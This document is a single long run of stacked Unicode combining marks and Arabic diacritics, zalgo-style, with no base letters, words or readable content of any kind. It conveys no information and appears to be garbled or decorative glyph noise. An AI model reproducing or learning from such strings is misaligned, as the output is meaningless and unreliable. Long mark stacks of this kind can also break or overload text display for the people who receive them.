̷̷̴̷̴̴ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̢̢̨̳̙̲̹̪̖̩͔̞̥̐̽̌̈́̋͆ͨ̐̽̉ͪͨ̕͘͟͟͡͏̷̸̷̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̧̨̢̧̛̘͙̲̺̫͚͍͎͓̟͇͎̦̯͖̱̮͉̳̱̯̦̥̭͇͍̣͕̻͔̞̽͋͋̌ͭͥ͋͗̉ͥ̑̃̓̀́͌ͬ̒ͤ̎͗ͯ͑ͤ̀ͩ́̌̀ͮ̂̓͆ͬ̀͘͘̚̕͘͘͟͜͟͟͜͝͞͞͝͡͠ͅ҉ًَُّ͍̬ͨ̓͝͡͝͏̴̴̵ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّ̡̨̡̪̮̻̫̫̤̯͈̬͉͉͍̙̜̳̪͇ͪͬ̈́̆̊̆̓́̀͆̽̇͂ͩ͆ͪ̾͐̀́ͮ̂͘͜͢͟͝͝͝ͅ҉ّ̝҉̴̴̵̷̴̶̴̵̸̷̶̷̷ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍََََََََََََُُُُُُُُُُُِِِِِِِِِِِّّّّّّّّّّّ̧̨̢̨̧̨̡̧̛̙͔̰̹̟̯̟̘̬͓̞̠͕̪͍̭͍̹̯̘͙̜̖͈̳͍̤̪͍͓̥͇͉̦̰̰̠̳̺̥͎̩͉̍̌̀̏͋̇́͗̌ͯ̈́́ͯ͂͛̍̂̿͋̋ͭ̅͒͊́̀̽̔̀͑ͬ̌̂͛͛̄̽̃̄ͯͨ͘̕͘͟͜͜͟͢͢͢͠͞͞͞͠҉̶ًًٌٌٍٍَُُِِّ̲̙͔͕̯̻̘͎͊ͤ͂ͩ͒̿͜͟͝͏̶ًًًٌٌٌٍٍٍََََُُُِِِّّّّ̡̢̧̨̡̛̛̛͍̳̗̥̰͇͙̗̘͋͗̑̓̀̂ͩ͗̕͟͝͞͞ͅ҉̶̸̵ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّ̨̧̧̨̢̢̡̢̖̤̰̗̹̺͙̳̰̪̹̮͓͎̦͇̦̞̞͓͖͔̬̣͕͎̰͕̥̙͕̯͐̋ͧ͆́͐́̉͑ͭ͋͌ͫ͂ͥ̊̉̃͛͆ͯ̋ͬ̇ͨ̑̆͌́̓ͥͪ̇͐̕͘͘̚͢͢͜͜͢͟͡͠͞͠͞͝͠͝͝͠ͅͅ҉̸ًَُّ̤̫̘ͫ͋҉̸̴̴̶ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̧̨̛͖̪̻͇͓̰̭͎͖̼̗̰͉̩̹̤͒ͩ̊̈͐̀̏ͥ̄̊͆̓ͥ͘͘͟͠͝͝͝͠҉ًٌٍٍَُِّّ͚̖̅̓̆̍͞͏̷̵ًًًٌٌٍٍَََُُُِِّّ̡̡̛̦̲͈̳̳̗̔ͧ̔ͫ̋̅͒̓̔͜͢͡͠͡͝͝ͅ͏ٌِ͔̃͏ًًٌٍٍََُُِّّ̘̹̗͖̙̬̺ͧ́ͣ̈ͥ͑͘͏ًٌٌٍٍَُِِّ̡̢̫̣̀̔ͬ̉̕͟͞͝ͅ͏ًَّ̝̉҉̵ًٌٌٍٍَُُِِّّ͉̰̹̮̯̟͓̝͔̎́͆̊̂̌͟͟͝҉ًٌٍَُِّ̘̱̬̩͂ͭͬ҉̷ًٌٍَُِ̳̞̮̄̎̂ͣ͢͝͏̵̶ًًًٌٌٍٍَََُُُِِّّّ̢̡̢̫̲̪̫͍̙͉̘͉͍͓͂ͭ̏ͣ͘͟͜͢͝͠͏ٌ͎̄҉̵ًًٌٌٍٍٍَََُُِِِّّّ̨̨̧̨̧̡̡͖̙̗̪̰̤ͯ̂̓ͩ̄ͧ̋̇͆̉ͣ͟҉ًًًًٌٌٌٌٍٍٍَََُُُُِِِّّّ̨̰̣̦̠̰̰̝̱̫̜̝͔͖͉̋͊́̈̈́͑ͯ͛̀̀ͪ̽ͥ̅̑̕̕͟͜͢͝͠͞͠͞͠͡͠͝͏̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̡̨̨̠̻̳̺̲̻̻̯͍͈̳̩ͯ̀̄̽ͤ̔́̅͌̀͘͞͏̶̴̷ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̧̨̨̨̛͖̮̣͕̫͇̖͉̣͓̥͈̲͙̈́ͧͫͭͣ̽ͬ̈́̐̽̌̑̄̂͛̈́̀̍̎̕͘͜͡͡͝ͅ͏ًٌَُِ͙̈́͜͡͞҉ٍّ҉̵ًٌٍََُِّ̤̥̗͒̈̋̀͂͟͏̶̷̴ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̛̛̛̛̯̳̟̯̦͓͎̲̺͎̯̣̜̈ͤ̒̂̅̀͐́̽́̏ͬͮ̊̕̚͢͢͟͡͝͡ͅ҉ٌٍَُِّ̢̻̙͛͋́͗͑͞҉ًًٌٌٍَُُِِّ͙̜̱͇̜̔͐̐̐͗̓̕͘͜͝͠͏ًٌٍَُِّ̛͇͙̼̫̘ͧ̀̒̀ͤ̓̚̕͢҉̶ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّّ̡̧̨̡̠͉̙̖̖͔̙͈̲̹͖̤͚̔̏̏̃̍́ͩͨ́ͫ̏̇ͪ̽̔̆́́̀͘̕͢͢͠҉̷̵ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̡̡̛̗̰͙͖͉̼͕̝̦͙͚͇̪̗̺̹͍̰̹ͫ̍́ͬ̈́ͥ̈́̇̌́̈̂̄̍́̀̇̏͑̎̔̽ͪ͘̚͟͟͢͠͠͞͡͡͝͝͠͞͠͞ͅͅ҉̸̵̵̷ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّ̧̨̧̢̛͉͈̻̫͓̹̦̝͉̙̲̘̪͇͔͎̙̦̩̳̟̙̥ͤͪͥ̑̈́̀̌̾̈́̈͋͒͌́ͧ̂ͧ̚͜͜͜͞͞͏̶̶̵̸̸ًًًًًٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̡̡̡̛̛͉̦̱̯̻̜͍̳̖͎̜̪͖͙͖͉͈̣̖̗̾̔̈́̆ͫ̈́̎͗͌͑̎̃ͥ́̓̒̍́̋ͦ͛͜͜͜͟͝͠͝͏̷̸̸̶̵ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̨̛̖͉̱̲̖̟̫̖͖͔̜͉͈͎̩̥̥̹̿ͩ̂ͮ̏ͣ͒̈̃͂̈ͪ̕̚̕͘͟͝͏̸̷̷̵̴̷ًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّّ̢̦̬͔͖͕͚̦̘͙͈̙̬̙̩̻͍ͪ͒͋ͯͨ́̀̎̅̈̋ͪͮ̇̾ͥ͂̀́ͫ̽̕͢͝͠͡͞͠͞͞͠͏̷̶̷̴ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُُِِِِِِِِّّّّّّّ̧̨̨̨͓̹̩̗͓̖͖͚̺̟̲̹̥͍͉̜̺̙͎͉̗̘̲̺̓̎̅ͨ̿͗ͮ̇ͦ̽̑̃̀ͪ͑̐̄̂̀̃ͮ̀ͦ̉͊̒ͪͣ͂ͧͥ̚̕͘͘͘͘͟͜͝͝͞ͅ҉̷̵ًًٌٌٍٍٍََُُِِّّّ̛̤̤̟͇͔̹̒͆͆̀̍̿͌͝͝҉ًَ̐͠͏̶̶̷ًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̨̢̢̛̯̦̩̪͚̬̖̯̦͖̞̰̦̘͓̭̹̹̙̩̝́̈ͮ͐͋ͧ͂͂̎̇̄̂́̔̂͑͆́̚̕͘͠͞͡͝͠҉̶̴̷̶̶̸̴̸̸̶̵ًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّ̧̡̧̧̢̨̡̧̨̧̨̧̛̛̛͍̜͎̼͎̱̹̦̹͍̜̟̜͉̳̣̣̹̭̠̠͔̖̘̯͓̘̹͍͇̳͕̞̳̞̯̼̪̫̼̬̫̦̳͚̞͇̪̣̰̍́̊̀ͨ͂ͮͭ̌̽ͯ̀͂͛̂̐́̐̓̾̈́̎̊ͥ͂͐ͫͨ̆ͬͮ̑̐̊͒͆ͣ̍̋̿̐̀̐̓ͩͨ͒ͭ́͛̈ͩ̑͊̎ͯ̂͊̒ͩ̕̚̕̕̕̚͘̕͟͟͜͟͟͜͟͜͜͟͢͜͟͠͝͞͞͝͡͝͠͝ͅͅ҉̶ٌٍِّ̥̗ͪ͋͠҉ًَُ̧̮̮̀͡҉̸̷̵ٌٍَِّ͓͙̙͚̪̊͛҉̵̴̸̴̴̸ًًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّ̨̛͉̬͎̦̝̘͕̤͓͖̹̞͎̱̓̉ͫ̇ͩ̾̏̀̕̕͝͠͝͞҉̶̴ًًًٌٌٍٍَََُُُِِّّّ̢̢̧̛̣͎̟̤̮̲̰̃̏ͬ̈́͊̿̾ͥ̈́̕͟͜͢͞͞҉̸̸̵̶ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََُُُُُِِِِِِّّّّّّ̢̢̢̛̛̩͖̫͎̘̞̯̬̤̜̣̰̣̼͓̝̯͈̹̠̫̏̀ͥ̾ͮ͐̒̇ͩ̄̽ͯ̇́́̔̀͑̀̽͜͜͢͝͞͏̶̸̶̷ًًًًٌٌٌٍٍٍََََُُُُِِِّّّ̛̗̳̞͍͔͚̪͔̠͗ͤ̅̄ͥͪ͂ͭ̀́̈̓͂͘̕͜͜͏̴̵ًًًًٌٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّ̡̢̡̨̛̣͙̬͕͇̖̥̥̩̲̗̹̘̹͕̰ͤͪ̓́͐͐ͫ̀̈́ͫͦ̃ͧ́͛̎ͥͫ́̇̅͘͘͜͢͡͞͏̸̴̴ًًٌٌٍٍََُُِِّّ̡̨̗̮̞̭̙̤̎̑̒ͧͧ̓̌͂̑ͦ͞͝҉̶̶̸̷ًًٌٌٍََُُِِّّ̯̳̠̞̲̈̽ͦͯ͘͡͡͏ًًٌٌٍٍٍََُُِِّّّ̨̧̳̠̠̰̹̫͔̽́̆̊̓͊̕͘͟͜͠͏̴̶̸̵ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̡̧̧̡̡̡̨̧̢̛̜̺͓̞͚̯͔̮̘͇̮̼̖̲̙̮̱̠͈̥͚̣̤̘̘͚͖̘̲̖͉̀̀ͬ͐̌̉̂ͤ͊ͩ͒̓̑̐̓̀̍̌͗ͨ̅̔ͦͯ̉̃̈̋̇̕̕̕̚͘̚͟͜͢͡͞͠ͅ͏ًٌٍُِّ̛̓͋̈͜͜҉̸̵̵̴ًًًًٌٌٌٍٍٍََََُُُِِِّّّ̨̞͚̮̻̱̘̝̫̯̱͉̋ͤ̋̇̆ͬ̃ͯ͌́ͮͤ̀̒̎̕̚͢͢͡͠͡͡͠ͅ͏̷̴̷̶ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̡̦͉̜̥̖̞̫͓̮̩͕̖͚̼́̐̈͌̾͋̏ͯ̐̅̇͘̕͟͟͞͞͏ٍَّ͍̎̈̿͢͏ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̛͈̝̦̩̻̯̰̥̖͇̬̙̫͇̊̔̃́ͪ̇ͫ̆̐ͬͫ̊̋̕͢͠͠͞͏̶ٌٍَُِّ̲̖̹̄̔҉̶̴̶̶̴̶̷̷̷ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̜̘̝̩̖̘̳̣̦̩͈̙̤̘͎̣̗̘̬̉̌̂ͦ̿̔̇͊ͯ̄̈ͫ̀̌̽̈́̊ͪ̚͟͟͟͟͢͢͡͠͠͞͏̵̴ًًٌٍٍََُِّّ̛̹̬̠̦̮̲ͨ͋͌̎͛́͞͏̶̷̸̶̶̷̸̶ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُُِِِِِِِّّّّّّّ̧̡̧̡̨̧̛̤͎͖̳͙̞̮͕̦̦͚̻̣͉͕͎̠̦̭͙̙̯̪̌ͪ̐̌̀̿ͣ͐̓̌́ͣ͐̉̀ͩ̀ͪͮͪͬ͐ͫ̏ͦ̒͛̒̋̕͘̕͜͢͟͜͞͠͏ًًٌٍََُُِّ͕͕̠̲͛̅̀̀ͤ͠͡͞͏̷̸ًٌٌٍٍََُِِّّ̡̧̥̬͇͖̫̣͓̖̹ͮ͊̊ͦ̃͋͠҉̸ًًٌٌٍَُُِّ͈̖̪̹̜̗̊ͥ̉̀̇̔͘͢͜҉̷̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̜̱̺͉̻̩̝͖͉͈̰̭̂ͮ̔̔́̃ͤ̒͑͋̉̾͢͜͟͡͝͡҉̵̸̶ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̧̧̧̧̛̠͖̰͈̱̺͇̜̤̱̩̱͖͚̼̫͕͉̪͒̋̅ͣ̓̾̀̂ͮ́̿ͪͬ̿̑͛̅̓ͥͦ̀̕͜͢͠͝͏ٌٍُِ̫̍͟͡҉̶̴̸̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̢̡̢̡̛̛̛̛̳̲̦̗̼̦̖̬͚͖̗̟̖̗̳͎͓̣̺̰͖̱͓͉͈̝̟͉̫͇̦̔͗͂̀͐ͧͬ̆̇ͮ̀ͯ̿́ͨͨͪͣ̌̆͘̚̕͟͜͟͞͞͡҉̸̷̷̴̶̶̷̸̸̶̸̴̷̴̶̷ًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّ̡̨̢̢̡̡̨̡̨̡̨̨̡̢̡̨̧̛̛͙̮̳̰̬̤̬͙͙̣̟̠̹̩͖͇̰̱͔̩̤̗̞͖̩̦̘̞̺͈͚̥̪͕̖͉̬̰͖̘͉̻̩͓̼͙̜̱̳͉̯̬̞͎̬̼͇̝̦̰̭̩̖̝͔̦̞̤̠̟̘̳͕̯̯̝̰͔̼̔͆̓͐͐̎̐ͩ̃ͧͩ̽̇̇̋̽͐̾̿̋ͯ̄̉͋ͪ̏̀̓̍͌͐ͧ́̀̉̇͗̎̏͋̓̀͌͗̍ͯͬͥ̒ͯͬ́̉ͤͪͫͯ̓ͫ͐͗́͂̀ͫ͒̈̉̅̈̀͒̎̊͘̚̚͘̕̕̚̕͘͟͢͟͟͜͜͡͡͝͠͝͞͞͝͠͝͠͡͝͞͝͡͞͠͝҉̸̸̴̴ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّ̣̫͓̼̘̮̞̭͖̱̻̝̯̤̟͊͑̃̉ͩ͑́̀͐̏͐̈͂͂͊ͯ̿̍͐͗ͣ͑͆͑̋͢ͅ͏̷̶̸̶̷̷̸̷̶̷ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̡̨̧̧̧̡̡̛̦͖͇͖͓͉̩̝̰͍̼͉̲̖̦̺̲̠͔͙̹̰̣̘̖̪̝̜̔ͬ̋ͦ̄̓̈́ͣ͒͌ͤͧ̿́̀̾ͣ̊̉͐́̑ͩ͑͊͜͟͠͡ͅͅ҉̶̸̵̷̵̶̶̴̶̶̶̵ًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّ̧̨̧̨̨̧̨̡̢̨̛͎̗͙̹̫̝̺̟̞͉̳͙͍̼̲͎̼̻͎̻͈̪͓̥̱̖͖͖͍̟̦͓͙̲͖̟̩͇̤̰̘̖̟͉̹̥̫̞̥̤͕̮̥̺̥̗̭̥̻͍̣̗̲̗͉̬̙̥̥̄̀̊̓͋ͧͧͦͭ́͆̋͑̀̀̉̃ͩ̋͐ͦ́ͦͤ͛ͫͮ͛ͦ̎̐̈́͆ͦ̂ͮ̅̌̀͗̇̏ͭ̀͐͛̀̑ͥͫ̓̒̔̈͆̓̄̒͊ͪ̇͌̉ͤ̎̇ͭ́̏ͭ̽͘̚͘̕̚͘̕̚͘̚͘͟͜͢͢͟͢͟͢͞͝͞͡͞͠͞͠͝͞͝͝͠͝͠͞͝ͅ҉ٍِّ̜͛͢҉̸̴ًًٌٌٍََُُِّ̢̼͓͔͚̜̙͖̄̇ͧͬ̍͜͡͡͏̶̴̵ًٌٍٍَُِِّ̨͚̦̗̺̖͚̀̋͒̄҉̶̷̷ًًًٌٌٌٍٍَََُُُِِّّّ͓̼͓̝̮̳͇͌̅́͋̇̽ͬ̔́̆͗̊̕͢͜͢͞͞͏̴̷̵̸ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̰̮̺̫̙̯͕̗̮̳̜̥͓̳̜̼͔̿̋ͨ̀̉̎̓ͫ̅̈ͮ̒ͪͥ̽̀͆̐ͥͨ̓̕̕̕͜͢͜͢͠҉̴ًٌُ̗̭̔̀͏̶ًٌٍٍَُِِّ̛̜̗͎͕̗̳̮͔̎̿͗ͭͪ͘͞҉̷̸ًٌٍَُِّ̨̛͉̘̭̝̱̮͋͒͑̉͌҉̶̵̷ًًٌٌٍََُُِِّّ̧̡̢̢͉̙̜̩̙̺̘̙̖̒̈́̂ͦ́̅ͦͭ̚҉̵̷̸̸ًًًًٌٌٌٍٍٍٍََََُُُُِِِّّّّ̢̢̢̨̢̲͇̻̺̰̦̫͈͖̹̹̞ͦ̉͗̓ͥ͌͐ͣ̾ͮ̄̉͜͞҉̸̸̶ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̨̛̛͍̤̯͚̳͖̻̮̟̱̼͍̲̠͖̠̻̞̼̝́ͯͬ̀ͪ̓ͪͭ̏̽̔ͩͤ̚͘͢͢͠͠͠͡͞͠͞͠҉̷̸̸ًٌٌٍَُُِِّ̟͖̯̪̥͇̰̣͑̐ͦ̈̀̄̈͘҉ٍ̩̿҉̶̶̴̸̴̴̷ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̢̢̧̧̧̼̭̥̣̳͍͍̞̦͓͍̦̗̮͉̜̟͉̙̰͍̩̦̳̪̗̗͚͎̫̩͖̜̝̪̳̊̃̍̑ͨ̎̀͌̽ͣͭ͋ͥͩͥ͆̈́̊̄͗́͋͗ͮͤ͒ͫ̀̾̒̉͗͌ͧ̒́ͨ̌̚͘̕͘̕̕̚͜͟͟͟͜͜͟͟͠͞͠͡͡͏̷̶̷̶̵̶̵̶ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̨̡̡̛̦̖̼̥̻̻̰̠̹̙̝̦̙̙̻̗̫͎͈̮̖̹̹̻͎̞̳͙̉͑ͤ̍ͤ̃ͪ̈́ͭ͂̽̓̇̔̄̇͌ͥ͐̽̉̑̒͒ͧ̔̇̊̕̚͟͢͟͢͜͟͢͞͡͡͝͞҉̶̵̴̴̵̸ًًًٌٌٌٍٍٍٍَََُُُِِِِّّّّ̢̡̛̗̼͕̠̼̜̟͙̬͚̙͈͉̑̂ͫ̈̅̑̄͗ͭ̑̒͗ͤ͘͘̕͢͢͡҉̸ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̡̛͖̜͉̟̬̞̘̠̱̮̺̯̮̒́ͥ́ͣͬ̒͊̓̐̓ͤͨͩ͋̚͘͢͜͜͝͝͝͞҉ًًٌٌٌٍٍٍََُُِِِّّّ̢̨̭̜̻̘̹͎͇̣̒͗ͩ̃́ͬ̓͆̊ͤ́ͫ̾̈̕͢͞ͅ͏ًٌَُ̡̜ͣͦ͆͒͟͟҉̷̵̶ًًٌٌٍٍََُُِِِّّ̢̨͇̹̠͚̠͍ͪ̍̓̓ͥ͜͢͢͞҉̴̵̵̷ًًًٌٌٌٍٍٍَََُُُِِّّّ̨̧̞͈͇̞͔͔̲̪́ͫ̽̓̓̈ͯͫ̇ͥͤ̾ͥͫ͘̕͘͢͞͏̵ًًٌٍٍََُِِّّ̮̦͍͚̱̤̮ͥ̊̓̍ͮ͡͞͏̷̶̶̵̵ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̧̨̡̨̛͍͙̠̻̘̪͖̩̦̘̱͔̤̥̼͍̫̩͕͎͉͉̬̥̟͕ͥͭ͒͊́̾́̅̇̅͆́̿̊̈͒͑͑̏̃͆͟͟͠͝͠͝͏̴ًًًٌٌٌٍٍََُُُِِّّ̨̧̛͔̞͓̭͇̝͈̃̀̿́̉͆̐͌͘͝҉̸̸̴̴̴̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̢̨̻̬̭͍̯̙͖͕̭̲͙̮̺͕̟̄͋ͫ̋̒̃̒ͧ́ͪ́̽͆̃ͥ͘̕̕͘͢͢͞͡͠҉ًٍَّ̢̠̜̋ͧ҉̸̶̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̨̛̫͚͙͇̺̗̺̬ͧ͂̓ͦ͛ͨ̉̆̕͘͞͏ٌٍُِ̧̰͊͝ͅ҉̸̶̶̶̴̶̸̶̶̶̴̷̸̷̸̴̷̴̵̴ًًًًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّّّّ̡̢̨̧̡̧̨̨̡̧̛̛̤̱̙̪͎͍̟̰̠̲̬̘̥̩̻̘͎͍̘͔̻̤͔͓̖̻̪̼̭̺͍̜̠̭̲͕̘͓͔̙̲̯̭̻̞̙̪̞̠̼͓̟̰̳̖͉̲͚̯̝̪͎̞͔͈̙̟͙͇̰͓͈̞̪̹̬ͨ̀͌̅̀ͬ́̇̓͑ͭ̊́̒̀̿͑́͛̂̍̃͆̉ͮ̏̅ͯͩ̆̇ͯ̓̾̀ͧͤ͋̔͑̐́̌͋̎̑̀̌ͯ͆̽̾̿̀́͒́̒̋͆̓̑̉͂̇̍ͪ̀́̔̈́ͬ̊͒̒͐̌͂ͩ́͗̌ͤͯ͊̏̌̋̈̔́͆ͪ͋̀ͣ̇͘͘̚̚͘̚͘̕̚̕̕̕͢͢͟͢͜͢͢͢͟͟͟͟͜͜͟͟͟͟͠͠͞͝͞͝͡͞͝͝͞͠͡ͅͅ҉̵̷̵̴ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̨̢̣̣̙̲̭͇͕͔̰̠̭̯̣ͬ̌͑ͨ̾̀̀ͭ̒ͤ̆ͯͪͤ̑͆͟͢͟͟͡͝͝͝͏̸̷̷ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̡̡̨̢̧̛̥̤͍͎̮͙͙̘̠͈̠͈̞̬̼̘̗̻ͯ̐̃́̄͛ͯ̆ͥ͜͢͟͟͝͞͝͏ًَ͓͏̶̶̴̶ًًٌٌٍٍََُُُِِّّ̧̡̥̼̰̣̗̤͓̟̀̓̔́ͣͨ͞͞͠҉̵ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ̢̨̰̘̲͎̙̺̦̪̦̤ͣͩͬ̆̆͘͜͜͜͠͞͡͠ͅ͏̴ًًٌٌٍٍٍََُُِِِّّ̧̭̥̞̤̦͈͊ͧ̽̒ͣ̀͐͘͟͠͝҉̵̸̷̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̢̡̨̨̢̨̛̛̟͕̤̤̫̥͙̟̬̣͕̣͈̪̠̱̳̻̦̰̤͎̱̲̪̲̫̤̤̏̃̉́̽ͮ̅̀̑͛͆̊ͭͩ̂̌̿͛ͪ̊̆ͪ̆͂̔͊̑ͧ̅͐͘͘͘̕͢͜͟͜͠͝͠҉̷ًَُͯ҉̸̵̴̵̴ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢͚̻̤̭̺͙͖̙͚̹̤́ͯ͑̅́͂̔̔̽̊ͤ̅͜͜͢͡҉̴̵ًٌٍٍَُِِّّ̛̹͈̱͖͖͔ͫ̀̏̍͋̚͞҉̸̸̸̵̸̷̴̸̵̸ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّ̨̭̪̠̭͖̪̘̮͓̝̣͓̬͔͕̗̲̘͎̠̣͕̩̱̬̰̬ͬ̐̀ͧͤ̒̐̊͐̽͐͌̈̇̉ͨͦͧ̀̑ͤ̈̈́̓͛̇͘̕͜͜͠͞͝͠͡͝҉ٌ͏ًٌٍٍَُِِّّ̪͈̻̠̾͗̆͋ͮͥ҉̴̷̶ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّ̧̧̛̛̥̰̪̳̗͓̮̯̰̪͙̗̰̲̞̥͍̮̰̥̯̙̟̫͊ͧ̈̈̆̇ͣ̾ͪͤ̅ͫ͋ͯ̑̿̇̓ͥ̄̇̎͆ͯͯ̀͘͢͟͝͠͏̶̸̴̷̴̵̵̸̵̷̶̷̴̶̵̸̶̵̷ًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّ̢̧̢̧̧̡̧̨̢̧̧̧̢̢̛̛̱̮͚̘̻͕̞̮̠̺͔̦̼̟͙̱̜̟͓̳̘̮̦̪̼̝̺͖̤̬͓̜̹̹͉͙͓̼̗̥̤̥̮̝͖͎̖̳͕̻̮̭͚͖̻͓̬̳͍͇̹̻͈̮̭̭̪̼͙̩̜̭͖̪̫͈̙̯̬̥͎̱͌͛ͤ̈̔͑̀̾͗͐ͦ͒̿̇ͬͧͬ̊̀̉ͭ̊̿͊̇̀ͣͩͮͦ́̽̍͑ͮ͗͋ͬ̏̇͆̀̂̈ͮ͂͒͂̀͑̈ͨͯ̌͂ͥ̽̍̈͛̀̀̉̓ͧ͑̈́̀͂̄́ͦͦ̌̃̾̊̎̃͐̐̀̿͒ͬ͘̕͘̚̕͘͟͢͢͜͢͟͟͟͟͢͜͞͞͝͠͠͝͡͠͝͡͡͠͝͠͞͡͝ͅͅͅ҉̸̸ًًًٌٌٍٍَََُُُِِّّّ̨̡̪̞̝͎͚͍̫̤̙͚͒͗ͬ̈̋̒̆̿͑̀ͪ͘҉ٌِ̱͠͏̵̴̵̴ًًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̨̲̦̙̞͈̟̙̙͕̳̖̦͋͆̍́̌̎́̓ͯ̍͂̅͛́ͤ́͘͘̚͝͏ٌٍُِّ̳̬̤͕̟͗̈́̌͠҉̷̸̷ًًٌٌٍََُُِّ̰̬̤̖̙͓ͦͨͪ͋͌ͫ͘͢͏ًًٌٍٍََُِِّّ̛͉͉̜̼̺͎̝͎͐͊̀̊̇̓͝͏̷̶̶̷̷̴ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̢̢̨̧̘̞̰̣͓̘̻͇͔͇̱̺̮͔̘̺͕̮̬͈͈͔̟̰͓̳͔̰̫̾̽̈́͋̄̾ͬ͑͋ͫ̑ͩͣ͒́ͥ̀ͫͭ͛͐̀͋̾̇͌͒̾̉̒́͘̚͘͘̕͢͢͞͞͠͞͝͡͝͡͞͝͝͠͏̶ًًًٌٌٍٍََُُِِّّ̢̘͕̞̻͈͇͚̹͍͓̾̾͒ͭ̅͗̋͘͢͜͟͟͞҉̴ًٌٌٍَُُِّ̝̠͉̫̪̔̈͑̅̊̚͡͞͏̸ٍِّ̥̮̙